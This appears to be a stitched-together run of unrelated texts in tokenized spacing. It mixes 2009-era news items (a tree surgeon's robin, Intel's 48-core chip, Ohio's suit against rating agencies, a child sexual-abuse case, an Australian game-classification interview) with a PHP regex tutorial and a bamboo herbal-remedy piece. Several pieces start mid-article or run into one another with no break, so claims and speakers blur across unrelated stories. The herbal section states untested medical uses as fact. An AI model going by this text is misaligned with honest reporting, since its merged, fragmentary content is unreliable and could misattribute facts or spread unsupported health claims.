In contrast , hospital cleaners are paid just £ 6.26 an hour but help society by making sure infections do not spread - which would mean people cannot work , or are not as profitable .
The report said : ' Not only do they clean hospitals and help maintain standards of hygiene to protect against infection but they also contribute towards wider health outcomes .
' The importance of these cleaners is often underestimated and undervalued in the way they are paid and treated .
' We estimated that for every £ 1 they are paid , over £ 10 in social value is generated . '
The report called for a high pay commission to recommend a maximum national pay differential and the introduction of a transaction tax to reduce high risk and unsustainable trading .
It said high pay should be ' reined in ' .
The foundation 's Eilis Lawlor said : ' Pay levels often do n't reflect the true value being created .
' As a society , we need a structure which rewards those jobs that create the most societal benefit , rather than those that generate profits at the expense of society and the environment . '

You 're more likely to find them perched on the handle of your spade .
But this robin is clearly more familiar with humankind than most .
As well as favouring the shaven head of tree surgeon John Hancock , he also turns up daily on the steering wheel or dashboard of his van to be hand - fed crumbs of bread or oatmeal biscuits .
A head for heights :
Tree surgeon John Hancock with the wild robin he has befriended
Mr Hancock , 40 , said his feathered friend started dropping in for lunch a fortnight ago , although he has been a familiar sight for longer .
As soon as Mr Hancock and colleagues Tom Murray and Matthew Paddan drive their truck into the yard in Worcester , the robin flies down .
' He has become tamer and tamer and it's a lovely feeling having a wild bird perched on your hand eating titbits from your fingertips , ' said Mr Hancock , a father - of - two .
' We used to throw the odd crumb towards him , but none of us expected him to join us in the truck every day .
He will take anything out of your hands and seems to enjoy human company . '
Now the robin descends from nearby trees every day and lands on John ’s wing mirror ready for the snacks they bring especially for him .
Lunchtime !
John breaks up some breadcrumbs as the robin waits on his car window
With his workmates , John feeds the robin for 15 minutes before shooing him away so they can get back to work .
John has put video footage of the robin on YouTube , where it has so far been watched over 5,000 times .
He said : ' We see robins quite often in our line of work , but no tree surgeon ever has them this close . '
Pride of place :
The robin has flown down from nearby trees and perched on John 's wing mirror every day for the last two weeks
Mr Hancock said since he has started feeding the robin , which he is yet to name , the bird has developed a taste for Chicken Nibblers - snack size pieces of chicken covered in breadcrumbs - which he sometimes includes in his packed lunch .
The three workmates , who are all tree specialists for Worcester City Council , plan to leave fat balls hanging in the yard , on the outskirts of the city , so the robin is well fed over the Christmas break .
Robins have become a traditional symbol of the British winter and are a popular illustration on Christmas cards .
Many continental robins join native birds here for the winter to escape the colder temperatures on the continent .
Good taste :
The bird eats titbits from John 's fingertips and prefers Chicken Nibblers - small pieces of chicken covered in breadcrumbs
Native robins are noted for their tameness , and are considered the easiest to train to feed from the hand .
Continental robins are often shot for sport or food and , as a result , remain a shy woodland species .
Louise Pedersen , from the RSPB , said the bird 's tameness suggested it was almost certainly a native robin .
She added : ' They are known as the gardener 's friend and will often come up to people for food once they have built up a relationship with someone .
' Robins are very territorial so it is very likely this is the same bird each time who knows it is safe .

Single Chip Cloud Computer has 48 Intel cores and runs at as low as 25 watts
( PhysOrg.com ) --
Researchers from Intel Labs demonstrated an experimental , 48 - core Intel processor , or " single - chip cloud computer , " that rethinks many of the approaches used in today 's designs for laptops , PCs and servers .
Researchers from Intel Labs demonstrated an experimental , 48 - core Intel processor , or " single - chip cloud computer , " that rethinks many of the approaches used in today 's designs for laptops , PCs and servers .
This futuristic chip boasts about 10 to 20 times the processing engines inside today 's most popular Intel Core - branded processors .
The long - term research goal is to add incredible scaling features to future computers that spur entirely new software applications and human - machine interfaces .
The company plans to engage industry and academia next year by sharing 100 or more of these experimental chips for hands - on research in developing new software applications and programming models .
While Intel will integrate key features in a new line of Core - branded chips early next year and introduce six - and eight - core processors later in 2010 , this prototype contains 48 fully programmable Intel processing cores , the most ever on a single silicon chip .
It also includes a high - speed on - chip network for sharing information along with newly invented power management techniques that allow all 48 cores to operate extremely energy efficiently at as little as 25 watts , or at 125 watts when running at maximum performance ( about as much as today 's Intel processors and just two standard household light bulbs ) .
Intel plans to gain a better understanding of how to schedule and coordinate the many cores of this experimental chip for its future mainstream chips .
For example , future laptops with processing capability of this magnitude could have " vision " in the same way a human can see objects and motion as it happens and with high accuracy .
Imagine , for example , someday interacting with a computer for a virtual dance lesson or on - line shopping that uses a future laptop 's 3 - D camera and display to show you a " mirror " of yourself wearing the clothes you are interested in .
Twirl and turn and watch how the fabric drapes and how the color complements your skin tone .
This kind of interaction could eliminate the need of keyboards , remote controls or joysticks for gaming .
Some researchers believe computers may even be able to read brain waves , so simply thinking about a command , such as dictating words , would happen without speaking .
Intel Labs has nicknamed this test chip a " single - chip cloud computer " because it resembles the organization of datacenters used to create a " cloud " of computing resources over the Internet , a notion of delivering such services as online banking , social networking and online stores to millions of users .
Cloud datacenters are comprised of tens to thousands of computers connected by a physically cabled network , distributing large tasks and massive datasets in parallel .
Intel 's new experimental research chip uses a similar approach , yet all the computers and networks are integrated on a single piece of Intel 45nm , high -k metal - gate silicon about the size of a postage stamp , dramatically reducing the amount of physical computers needed to create a cloud datacenter .
" With a chip like this , you could imagine a cloud datacenter of the future which will be an order of magnitude more energy efficient than what exists today , saving significant resources on space and power costs , " said Justin Rattner , head of Intel Labs and Intel 's Chief Technology Officer .
" Over time , I expect these advanced concepts to find their way into mainstream devices , just as advanced automotive technology such as electronic engine control , air bags and anti-lock braking eventually found their way into all cars . "
Cores Allow Software to Intelligently Direct Data for Efficiency
The concept chip features a high - speed network between cores to efficiently share information and data .
This technique gives significant improvement in communication performance and energy efficiency over today 's datacenter model , since data packets only have to move millimeters on chip instead of tens of meters to another computer system .
Application software can use this network to quickly pass information directly between cooperating cores in a matter of a few microseconds , reducing the need to access data in slower
off - chip system memory .
Applications can also dynamically manage exactly which cores are to be used for a given task at a given time , matching the performance and energy needs to the demands of each .
Related tasks can be executed on nearby cores , even passing results directly from one to the next as in an assembly line to maximize overall performance .
In addition , this software control is extended with the ability to manage voltage and clock speed .
Cores can be turned on and off or change their performance levels , continuously adapting to use the minimum energy needed at a given moment .
Overcoming Software Challenges
Programming processors with multiple cores is a well - known challenge for the industry as computer and software makers move toward many - cores on a single silicon chip .
The prototype allows popular and efficient parallel programming approaches used in cloud datacenter software to be applied on the chip .
Researchers from Intel , HP and Yahoo's Open Cirrus collaboration have already begun porting cloud applications to this 48 IA core chip using Hadoop , a Java software framework supporting data - intensive , distributed applications as demonstrated by Rattner today .
Intel plans to build 100 or more experimental chips for use by dozens of industrial and academic research collaborators around the world with the goal of developing new software applications and programming models for future many - core processors .
" Microsoft is partnering with Intel to explore new hardware and software architectures supporting next - generation client plus cloud applications , " said Dan Reed , Microsoft 's corporate vice president of Extreme Computing .
" Our early research with the single chip cloud computer prototype has already identified many opportunities in intelligent resource management , system software design , programming models and tools , and future application scenarios . "
This milestone represents the latest achievement from Intel 's Tera - scale Computing Research Program , aimed at breaking barriers to scaling future chips to 10s - 100s of cores .
It was co-created by Intel Labs at its Bangalore ( India ) , Braunschweig ( Germany ) and Hillsboro , Ore. ( U.S. ) research centers .
Details on the chip 's architecture and circuits are scheduled to be published in a paper at the International Solid State Circuits Conference in February .

PHP has some sets of functions , which are not known to the wide audience .
One of those is mb_ereg_* family of functions .
There is a common misunderstanding , that mb_ereg_ * functions are just unicode counterparts of ereg_ * functions : slow and non-powerful .
That ’s as far from truth as it can be .
mb_ereg_ * functions are based on oniguruma regular expressions library .
And oniguruma is one of the fastest and most capable regular expression libraries out there .
Couple of years ago I made a little speed - test .
Anyway , this time , I was going to tell about it ’s usage .
PHP - documentation is n’t telling much .
Let ’s start with the basic fact : you do n’t need to put additional delimeters around your regular exprsssions , when you use mb_ereg_* funcitons .
For example :
1 2 3 <? php // find first substring consisting of letters from ' a ' to ' c ' in ' abcdabc ' string .
mb_ereg ( ' [ a - c ] + ' , ' abcdabc ' , $ res ) ;
To execute same search , but in case - insensitive fashion , you should use mb_eregi ( )
mb_ereg ( ) , mb_eregi( ) and mb_split ( ) functions use pre-set options in their work .
You can check current options and set the new ones using mb_regex_set_options ( ) function .
This function is parametrized by string , each letter of which means something .
There are parameters ( you can specify several of these at the same time ) :
‘i’ : ONIG_OPTION_IGNORECASE
‘x ’ : ONIG_OPTION_EXTEND
‘m’ : ONIG_OPTION_MULTILINE
’s ’ : ONIG_OPTION_SINGLELINE
‘p ’ : ONIG_OPTION_MULTILINE | ONIG_OPTION_SINGLELINE
‘l’ : ONIG_OPTION_FIND_LONGEST
‘n’ : ONIG_OPTION_FIND_NOT_EMPTY
‘ e ’ : eval ( ) resulting code
And there are “ modes ” ( if you specify several of these , the LAST one will be used ) :
‘j’ : ONIG_SYNTAX_JAVA
‘u ’ : ONIG_SYNTAX_GNU_REGEX
‘ g’ : ONIG_SYNTAX_GREP
‘ c’ : ONIG_SYNTAX_EMACS
‘r ’ : ONIG_SYNTAX_RUBY
‘z ’ : ONIG_SYNTAX_PERL
‘ b’ : ONIG_SYNTAX_POSIX_BASIC
‘d’ : ONIG_SYNTAX_POSIX_EXTENDED
Descriptions of these constants are available in this document : API.
txt
So , for example , mb_regex_set_options ( ' pr ' ) is equivalent to mb_regex_set_options ( 'msr ' ) and means :
. should include
( aka “ multiline - match ” )
should include ( aka “ multiline - match ” ) ^ is equivalent to \ A , $ is equivalent to \Z ( aka “ strings are single - lined ” )
is equivalent to , is equivalent to ( aka “ strings are single - lined ” ) using RUBY - mode
By the way , that is the default setting for mb_ereg_* functions .
And , mb_ereg_match and mb_ereg_search families of functions take options - parameter explicitly .
So , back to functions :
1 2 3 4 5 6 7 <? php // make sure , that the whole string matches the regexp : mb_ereg_match ( ' [ a - c ] + ' , $ user_string , ' pz ' ) ; // ' pz ' specifies options for this operation // ( multiline perl - mode in this case ) // replace any of letters from ' a ' to ' c ' range with ' Z ' $ output = mb_ereg_replace ( ' [ a - c ] ' , ' Z ' , $ user_string , ' b ' ) ; // use basic POSIX mode
Ok , these were easy and similar to what you ’ve seen in preg_* functions .
Now , to something more powerful .
The real strength lies in mb_ereg_search_* functions .
The idea is , that you can let oniguruma preparse and cache text and / or regexp in its internal buffers .
If you do , matching will work a lot faster .
1 2 3 4 5 6 7 8 9 10 11 <?php mb_ereg_search_init ( $ some_long_text ) ; // preparse text mb_ereg_search ( ' [ a - c ] ' ) ; // execute search while ( $r = mb_ereg_search_getregs ( ) ) { // get next result // work with matched result } mb_ereg_search ( ' [ d - e ] ' ) ; // execute different search on the same text mb_ereg_search_init ( $ some_other_text ) ; // preparse another text mb_ereg_search ( ) ; // execute search using previous ( already preparsed ) regexp
This is the fastest way of parsing large documents in php , as far as I know .
Notes on charsets .
Though , it is often mentioned , that mb_ereg_ * functions are “ unicode ” , it would be more practical to say , that they are encoding - aware .
It is a good idea to specify , which encoding you use beore calling oniguruma .
Some options :
1 2 3 4 <?php mb_regex_encoding ( ' UTF - 8 ' ) ; mb_regex_encoding ( ' CP1251 ' ) ; // windows cyrillic encoding mb_regex_encoding ( ' Shift_JIS ' ) ; // japanese

The missing C - SPAN footage showing Sen. John McCain preventing a Democratic senator from getting an extra 30 seconds to finish a speech has been found .
The Republican senator from Arizona was outraged last week when Sen. Al Franken ( D - MN ) , who was presiding over the Senate , prevented Sen .
Joe Lieberman from getting extra time to finish his comments on the Senate floor .

“ I ’ve been around here twenty - some years , first time I ’ve seen a member denied a minute or two to finish his remarks , ” McCain said .
“ And I must say that I do n’t know what ’s happening here in this body , but I think it ’s wrong . ”
Political observers quickly pointed out that , in October 2002 , McCain himself prevented Sen. Mark Dayton ( D - MN ) from finishing a speech opposing the Iraq war and Congress ’ move to authorize President Bush to launch military action against Iraq .
But when MSNBC ’s Rachel Maddow
Show went to find footage of that incident in the C - SPAN archives , producers found the relevant part of the video mysteriously blacked out .
Now C- SPAN has provided an explanation — as well as the footage of McCain shutting down debate .
“ C- SPAN library video content created prior to 2003 was originally captured on two - hour VHS videotapes which were later digitized for permanent storage in our archives , ” the broadcaster said in a statement .
“ This process is occasionally susceptible to small errors that can occur at top - of - the - hour tape changes .
An example of this type of error in the digital online file from
Oct. 10 , 2002 at noon ET . ”

The recovered footage shows Sen .
Dayton asking for an extra 30 seconds to complete his speech .
Sen. McCain ’s voice can be heard off - camera : “ I object . ”
“ Either Sen . McCain cannot remember that he himself objected to a senator getting an extra 30 seconds to finish his remarks during the Iraq war debate , or Sen .
McCain knows perfectly well that this stuff happens in the Senate , ” Rachel Maddow said Monday night .
“ It happens , and he just said it was unprecedented out of sheer hackitude . ”
This video is from MSNBC’s The Rachel Maddow Show , broadcast Dec. 21 , 2009 .

Bamboo has been making a lot of news lately as a green building resource .
It is a highly renewable source of flooring material and is used as a basic component in the construction prefab homes .
However , bamboo has been a very important ingredient in acupuncture and Chinese Herbal prescriptions for thousands of years .
In Chinese , Bamboo is called Zhu .
Different parts of the plant including the shoots , resin and leaves are used for different therapeutic actions .
As discussed in previous posts , there are thermal and taste properties to foods we eat .
Herbs are categorized in a similar fashion .
Zhu ru are the shavings of young bamboo shoots .
It is considered slightly cold and has a sweet taste .
Therapeutically , Zhu ru is used to treat acute fevers and to resolve phlegm disorders caused by heat , eg. deep cough and yellow phlegm , convulsions and vomiting .
Zhu li is bamboo sap .
Zhu li also exhibits a very cold nature and a sweet taste .
The Chinese medicinal applications of zhu li include acute fever , cough with profuse expectoration of phlegm and sputum , heat in the lungs , and loss of consciousness .
Dan zhu ye are the leaves of the bamboo plant .
Bamboo leaves are also considered cold and have a sweet taste .
They are used therapeutically to treat fever , clear heat and also function as a diuretic to clear heat and blood in the urine .

NEW YORK , Nov 20 ( Reuters ) -
The three largest credit rating agencies were sued on Friday by Ohio , which said their pursuit of profit and ties to Wall Street resulted in inflated ratings on toxic mortgage debt that cost state pension funds hundreds of millions of dollars .
Attorney General Richard Cordray filed the lawsuit against Standard & Poor's , Moody 's Investors Service and Fitch Ratings on behalf of five pension funds that say they lost more than $ 457 million because the agencies gave false and misleading , often " triple - A " ratings to securities they knew were risky .
" The credit rating agencies sold out , and they sold us out , " Cordray told reporters .
" They traded in their objectivity , and in exchange received massive profits . "
S&P is owned by McGraw - Hill Cos MHP.N , Moody 's by Moody 's Corp MCO.N and Fitch by France 's Fimalac SA LBCP .PA .
Friday 's lawsuit in federal court in Columbus , Ohio , was filed four months after the nation 's largest pension fund , the California Public Employees ' Retirement System , sued the agencies over ratings they said caused $ 1 billion of losses .
California Attorney General Jerry Brown subpoenaed the agencies in September as he examined whether they violated state law .
Cordray accused the agencies of breaking Ohio law , and said he does not plan to start a class action .
The Obama administration , Congress and regulators are weighing financial industry reforms that could tighten ratings oversight and limit perceived conflicts of interest .
Rating agencies have in lawsuits rejected allegations of wrongdoing , including fraud , and said their ratings constitute opinion protected under the U.S. Constitution .
S&P spokesman Steven Weiss and Moody 's spokesman Michael Adler said Ohio 's claims lack merit , and Adler added that Cordray " appears to be seeking new scapegoats for investment losses incurred during the unprecedented market disruption . "
Fitch Managing Director Kevin Duignan declined to comment , saying Fitch had not received the complaint .
New York Attorney General Andrew Cuomo ended a probe of rating agencies last year with a pact that changed how fees are charged to review mortgage - backed securities .
COWS
Friday 's 77 - page lawsuit recounted many alleged instances where agencies either appeared unconcerned about ratings ' accuracy or else hungered for more business .
It included a widely quoted comment by an S&P analyst in 2007 : " It could be structured by cows and we would rate it . "
Cordray , like many critics , said the " issuer - pays " model where debt issuers pay agencies for ratings creates a conflict of interest that could lead to inflated ratings .
In a closely watched New York case in which the leading First Amendment lawyer Floyd Abrams is defending S&P , U.S. District Judge Shira Scheindlin in September said ratings might not deserve the broadest First Amendment protection when they are distributed to a " select group of investors . "
She also said rating opinions could be challenged " if the speaker does not genuinely and reasonably believe it or if it is without basis in fact . "
Cordray suggested the agencies ' close ties to Wall Street negates any First Amendment defense .
" We do think that they went well beyond offering dispassionate , neutral opinions , where the First Amendment would have more traction , " he said .
Ohio sued on behalf of the Ohio Public Employees Retirement System , the State Teachers Retirement System of Ohio , the Ohio Police & Fire Pension Fund , the School Employees Retirement System of Ohio and the Ohio Public Employees Deferred Compensation Program .
In afternoon trading on the New York Stock Exchange , Moody 's shares were down 47 cents , or 2 percent , at $ 22.72 , while McGraw - Hill was down 93 cents or 2.9 percent at $ 30.80 .

Abercraf , Wales
A sheep farm in the Brecon Beacons in mid-Wales is providing a glimpse of a post - carbon future , one in which green electricity is generated locally .
And the farmer involved , Howell Williams , has found that low emissions can mean high profits .
He is making £ 900 ( $ 1,500 ) a month from going green .
Howell has worked on the damp , golden hills above the village of Abercraf for 30 years .
One day , tramping back down along one of the streams that tip down from the hilltop , he had an eye - opening moment .
" I thought : ' What terrific power ! ' " he remembers .
" If only we could harness this . "
Howell Williams is making power for 20 households from one small stream Howell Williams spent £ 25,000 ( $ 41,000 ) on a water turbine , housed in a small shed over the stream , just next to his farm .
A £ 2,500 grant from the Brecon Beacons National Park helped him reduce the cost .
He showed me the equipment after a rainy few days and it was generating at its maximum rate , a constant 11 kW , all of it sold to the local electricity company .
" I think I am generating enough electricity for 20 houses , " Mr Howell says .
World leaders are under pressure to agree a climate deal in the Copenhagen talks , but the only pressure Howell Williams feels is from the water gushing 90 metres down the hillside .
He is thinking about installing another turbine .
On a recent Sunday , 20 local farmers came to see his mini - hydro station and 14 of them said they could see the potential for similar installations on their own farms .
' Borrowed water '
Welsh hill farmers have always struggled to scrape a living .
Water power offers the prospect of a steady income to supplement the up and down earnings from selling lamb .
This valley probably has scope for four or five such schemes which would make it a carbon negative valley
Chris Blake , The Green Valleys A few miles away , in the picturesque Dyffryn Crawnon valley , plans are being hatched for a bigger water turbine on another steep hillside dotted with woods , sheep and and stone farm buildings .
The difference is that this is to be a community project .
The profits , expected to be £ 12,000 a year , will be spent on energy - saving schemes for residents and more water turbines .
Projects like this are tiny compared with the overall demand for power , but the plans are just a start .
" It 's not going to generate all of our electricity needs but it 's going to produce a lot of it , " explains Chris Blake , who runs a local initiative called The Green Valleys , " And if we can get 40 or 50 schemes in this area then it really does start to make a big difference . "
He points out that the water is only " borrowed " : it 's extracted upstream and returned to the river below the turbine .
And the turbine house will be hardly visible , half - buried and covered in a turf roof .
The 16 kW Dyffryn Crawnon turbine will generate almost as much power as the inhabitants of the valley currently use .
" This valley probably has scope for four or five such schemes which would make it a carbon negative valley , this within 5 years .
It 's something fantastic to show to Copenhagen . "
Steep slopes Howell Williams took me to round up sheep and lambs and move them to some fresh , glistening pasture , in order to show off the spring above Abercraf which feeds his stream .
Howell Williams ' turbine leaves the landscape unscathed Water is diverted at this point to shoot down the hillside in a buried plastic pipe , gathering speed and force along the way .
He restricts grazing and the size of his flock , to try to control its impact on the landscape .
But the water turbine has transformed his environmental credentials and he is beginning to look at the sustainability of the farm as a whole .
Farming has had to face difficult questions in the debate over global warming .
There are the tractors , the manufactured feed , the methane given off by livestock : all combine to create a carbon footprint which has to be justified .
" You 're producing carbon - negative lamb , " I suggest .
" Yes , " Howell agrees , " I should imagine 90 % anyway . "
" I think it 's a good route to take with livestock .
We should make use of any natural resources we 've got - wood , water , the air you use .
It can all be brought together in one package . "
Not many people are lucky enough to have a steep slope and a fast - running stream on hand .
But if objectives set in Copenhagen are to be achieved , everyone will have to look around them , like Howell Williams , and find whatever opportunities they can to reduce their carbon emissions .

51 - year - old Vyacheslav Fetisov to play for CSKA in KHL ( Photo © khl.ru )
Yes , it ’s not a joke .
CSKA
Moscow is having problems as a lot of it ’s players are injured .
Yesterday , after the game against Atlant CSKA ’s head coach Sergei Nemchinov said that he had offered CSKA president Vyacheslav Fetisov to help the team .
They gave Fetisov one day to think it over and apparently he agreed .
This is what the team ’s press attache Natalia Masyakina had to say to RIA Novosti ( in Russian ) :
Fetisov agreed to play for CSKA .
Now we are working on the documents and if there are no problems he will be able to play on Friday against SKA .
Nothing can be said about the length of his contract at this moment .
News is also confirmed on the official KHL site ( in Russian ) .
Gamers have already donated more than $ 1 million in toys , games and books to the Child 's Play charity this year .
The goal for 2009 is to surpass the $ 1.4 million raised last year for children 's hospitals around the world .
“ The game community is really digging deep and we ’re on track for a record - breaking year , ” Child 's Play project manager Kristin Lindsay said in a press release Friday .
With winter holidays fast approaching , there are still many opportunities to pitch in and help the charity reach its goal .
Many local fund - raising events are still in the works .
Penny Arcade creators Gabe and Tycho will host the sold - out Child 's Play Gala and Auction Tuesday in Seattle ; on Wednesday , Ümloud ! will give San Franciscans a chance to rock plastic instruments for the cause .
If there 's no fund - raising event in your town , you can still contribute from home .
You can donate directly via Paypal .
Or you can buy one of those nifty Oscar Mike T - shirts from Giant Bomb or play BioWare 's Facebook game Gift of the Yeti .
Proceeds from both will help put fun stuff in the hands of sick kids .

It has said it would go further , with a 25 per cent cut , if a tough international climate agreement is reached at UN climate talks in Copenhagen in December , but this is looking increasingly unlikely .
Most people would assume that 20 years from now when historians look back at 2008 - 09 , they will conclude that the most important thing to happen in this period was the Great Recession .
I ’d hold off on that .
If we can continue stumbling out of this economic crisis , I believe future historians may well conclude that the most important thing to happen in the last 18 months was that Red China decided to become Green China .
Yes , China ’s leaders have decided to go green  out of necessity because too many of their people can’t breathe , ca n’t swim , ca n’t fish , ca n’t farm and ca n’t drink thanks to pollution from its coal - and oil - based manufacturing growth engine .
And , therefore , unless China powers its development with cleaner energy systems , and more knowledge - intensive businesses without smokestacks , China will die of its own development .
What do we know about necessity ?
It is the mother of invention .
And when China decides it has to go green out of necessity , watch out .
You will not just be buying your toys from China .
You will buy your next electric car , solar panels , batteries and energy - efficiency software from China .
I believe this Chinese decision to go green is the 21st - century equivalent of the Soviet Union ’s 1957 launch of Sputnik  the world ’s first Earth - orbiting satellite .
That launch stunned us , convinced President Eisenhower that the U.S. was falling behind in missile technology and spurred America to make massive investments in science , education , infrastructure and networking  one eventual byproduct of which was the Internet .
Sex attacker , 11 , secretly sent
to primary school
A boy of 11 who had been judged a serious risk to other children inflicted the most appalling sexual abuse on a classmate after he was secretly placed in a mainstream school .
The youngster , who was living in local authority care , had carried out sex attacks on children before but was never charged because he was too young .
Previous attacks : the boy was judged a serious risk
Instead , social workers moved him into specialist care , where he should have been taught .
But despite a two - inch thick file on his disturbing behaviour , he was put in a mainstream school , where he began the chain of events that led to the attack on a nine - year - old fellow pupil .
Last night , his victim 's devastated parents , who can not be named for legal reasons , said the move was an attempt by the council to save money .
And they demanded answers after it emerged the boy has since been placed in another mainstream school .
They told how , despite complaining to officials , they felt ignored by authorities and were forced to remove their son after his attacker was allowed to remain in classes for eight months - even after admitting the offence to police .
' We fear this boy still poses a serious danger to children , ' his heartbroken mother said .
' He is predatory and displayed all the signs of adult - like grooming , using threats and intimidation . '
The mother , 43 , said she only learnt about the boy 's past after her son was attacked .
Authorities were aware of his activity with other children but because at the time he was under ten - the age of criminal responsibility - he was never charged .
Within months of arriving at the school , the boy began grooming the younger pupil .
Then , with the knowledge of his care workers , he was allowed to visit his victim's home where the attack , in 2008 , was carried out .
The victim's mother said although the family were aware the 11 - year - old was living in care , they believed it was because his parents had split up .
' We obviously did n't know then he had a history of sexual abuse against other children , ' she said .
' He should never have been allowed to come to our home . '
The boy was charged with indecent assault but the case was dropped when he admitted the offence and was given a final warning - the youth equivalent of a caution .
He was not placed on the Sex Offenders ' Register .
The local ombudsman is now re-examining the complaint .
MP Sir Alan Beith , chairman of the justice committee , called for an independent inquiry .
He said : ' I 'm not satisfied that all necessary steps have been taken to learn lessons from the case . '
Northumberland council said the boy was ' doing well with foster parents and at a new school ' .
Any changes to the classification system must be unanimously agreed by Commonwealth , State and Territory ministers .
In South Australia the minister with responsibility for censorship is Attorney - General Michael Atkinson , and he has consistently opposed the introduction of an R rating for computer games .
Mr Atkinson , welcome to The National Interest .
Michael Atkinson : Thank you .
Peter Mares :
Why do you oppose the introduction of an R rating and 18 + classification for computer games ?
Michael Atkinson : Well I 'm opposed to extremely cruel violence or violence being anticipated in interactive games .
I 'm also opposed to depraved and cruel sexual games .
I 'm also opposed to games that encourage people with points for drug use , that is the use of illegal drugs .
The decision on this game to give it an MA15 + classification and in that sort of Commonwealth Classification Board I 'll be appealing against that classification .
I think it 's wrong , it does n't surprise me because the Classification Board in Australia does everything to try to get games in under the radar and film generally , but just because the system 's not being applied properly , does not mean that the principals in the system are wrong .
Peter Mares :
But would n't it be better to have an R rating so that then the Classification Board can say , ' Well this is clearly for adults ' , and consumers would know that .
If these games are getting in anyway .
Michael Atkinson :
No no , what I want the Classification Board to do is apply the guidelines properly .
And I do n't want the extremely violent , sexually depraved drug use games in Australia at all , because at the cinema , we can stop people under 18 going in to see outrageous movies .
We can't stop these interactive games that are extremely violent or depraved getting into the home and then getting into the hands of children .
Indeed the interactive games are I think a greater risk than film , because they are interactive , because people are n't just watching passively these horrible things that are happening , they are participating in them , they are doing them .
Peter Mares : Still , DVDs can also come into the home with R classification .
You know , parents can bring home an R - rated DVD , and then decide whether or not the kids get to watch it .
Michael Atkinson :
That 's true , but it 's not a reason to surrender .
We 're talking about games such as the Japanese game Rape Play , where one scores points for raping a mother and daughter .
Peter Mares :
But as I understand , that 's not allowed , that 's not on sale anywhere outside Japan , even in countries with R classifications .
Michael Atkinson :
Well I would n't put it past the Classification Board to make that an R - rated game , frankly , on their previous form .
Also we have games where you score points , and the name of this game is Narc , ( as in narcotics ) and you score points for injecting yourself with drugs .
Blitz the League is another game like this , an American football game where you take heroin , speed , LSD , marijuana , and ecstasy , and that of course helps you be a better athlete , and then you could even take a drug in the game to mask your drug use so you pass the drug test .
We have a game where the player straps explosives to himself and then blows himself up in a market and scores points for how many people he kills .
Peter Mares : Still , as you say yourself , many of these games are coming in , perhaps not the ones you mention , but ones which you find objectionable , and a recent study by Bond University found that Australian adults support the introduction of R-rating classification and that they use those classifications to determine what to buy for their children .
Michael Atkinson :
That was funded by the industry , normally ABC viewers mention that when the industry funds a survey .
They preface their mention of the survey .
Peter Mares :
Well you 've quoted the same survey previously favourably .
I 'm very happy -
Michael Atkinson : I do n't think so .
I do n't think so .
I think what you 're engaging in is advocacy for the R18 classification - moving a survey that was paid for by the industry .
Peter Mares : Attorney - General , I 'm not advocating anything , I 'm inquiring into this issue and I 'm asking your opinion .
I 'm making the point that the industry says from its surveys , let 's put it that way , that adults want classification so they can determine what to buy .
Michael Atkinson :
Well no that 's what the industry wants .
The vast majority of Australians has not turned their mind to the question of an R18 + classification for interactive games , it 's just not an issue out there in the electorate .
Most Australians do n't think about it , like me , many of them enjoy playing games such as The Wii , but they 're unaware of the extreme violence , depraved sex and the drug use which is available in the interactive game industry , and of course the industry itself wants to make these games .
They 're running a candidate against me in my seat of Croydon in the coming State election in South Australia and I look forward to the contest , because I rather doubt that they 'll get even 1 % of the vote , so much for the claim of 90 % of Australians favouring what the games industry wants .
Peter Mares : Well we 're going to hear from someone from the games industry who I think is organising to have someone stand against you later in the program .
Michael Atkinson :
They have n't managed to find anyone eligible to stand yet .
That 's how popular the proposition is .
Peter Mares :
Let me come back to another point though , that if there was an R18 + classification introduced into Australia , that would require all Attorneys - General to take part in a discussion to draw up the ratings .
Now you would be able to say this R18 classification should exclude the type of games altogether .
It should still exclude a whole range of games that are , as you see it , and I have to say I agree with you with these games , obnoxious , repellent , morally repugnant .
Michael Atkinson : I have no trust in the Classificaton Board to apply the guidelines sincerely or correctly , and therefore to draw up such guidelines would be to draw them up in the sure and certain knowledge that they would be stretched , and then broken .
But however I am happy to have a discussion of it , and indeed I cleared for publication a Commonwealth discussion paper on this issue back in April , and I 've got no idea why it has n't been issued yet .
Peter Mares :
Well we were wondering about that discussion paper , too , and that was one of the questions I was going to ask you .
We have n't been able to get a clear answer from the Attorney - General 's Department , the Federal Attorney - General 's Department , as to why it has n't been released .
What is your understanding ?
That discussion paper , as you say was meant to be released earlier this year .
Michael Atkinson : The Standing Committee of Attorneys - General was going to issue a discussion paper a couple of years ago , and I objected to it because it struck me as plain advocacy for the R18 classification , R18 + and it did n't contain any examples of these extremely violent and depraved games , so I insisted that such examples be included .
They are included in the Commonwealth discussion paper , and I cleared it for publication in April , so I 'm getting weary of the games industry claiming that I 'm suppressing discussion .
I 'm doing no such thing .
Peter Mares :
Well you 'd like to see that discussion paper come out .
Michael Atkinson : I 'm happy to have the discussion .
Indeed I think when most Australians see examples of the kind of depravity , cruelty , and extreme violence of these games you know , shooting off an opponent 's limbs , dismembering them , blood spray over the screen , torn flesh and protruding bone from dismembered limbs , heads exploding in a spray of blood .
I think that they too will say that this will have the effect of desensitising people who play these games , some of them , not most of them , but just some of them , to desensitising them to violence .
Peter Mares :
There is an argument that this is all academic , that banning these things does n't work anyway , because they 're going to come in from overseas .
Michael Atkinson :
Oh , sure the law of theft has n't worked these past few thousand years because people keep thieving .
Peter Mares : You say that 's not a defence .
Michael Atkinson : No .
I 'm just going to do what I can as someone who was elected with 76 % of the vote when I last faced election , and as someone who has the responsibility for the public good and the law to do what I can .
Now if this can be circumvented , then so be it , but I 've done my part .
Peter Mares : Attorney - General , thank you for your time .
Michael Atkinson : Thank you .
Peter Mares : South Australian Attorney - General , Michael Atkinson , discussing his reasons for opposing an R18 classification for interactive games in Australia .
To get a gamer 's perspective , I 'm joined in the studio by David Doe .
He 's an advocate of an R18 rating for games sold in Australia , and he works for a local game developer , Firemint .
David Doe 's also behind Gamers 4Croydon , a political party that wants to challenge Michael Atkinson in his State seat of Croydon at South Australia 's election in March next year .
David Doe , welcome to The National Interest .
David Doe :
Thank you for having me .
Peter Mares : I think , well what 's your opinion of this game we mentioned in the introduction , Modern Warfare Two ?
David Doe : Modern Warfare
Two is by all accounts the biggest entertainment launch in history .
The developers and the publishers should be very proud of the work that they 've done in this game .
I 've seen the objectionable level , which a lot of people would know from the term ' Remember , no Russian ' , as the Russian terrorists speak to you , as you exit a lift and into an airport .
That is -
Peter Mares :
This is the massacre scene , which I 've also seen footage of , where basically the player looking through a gunsight , goes into an airport and shoots a whole lot of people .
David Doe :
That 's right .
The player has a choice whether or not they want to shoot at the civilians .
They 're not required to kill the civilians to pass that level , but that level in particular is very confronting content , and it's a reason in itself to have an R18 implemented because it 's just not suitable for 15 year olds .
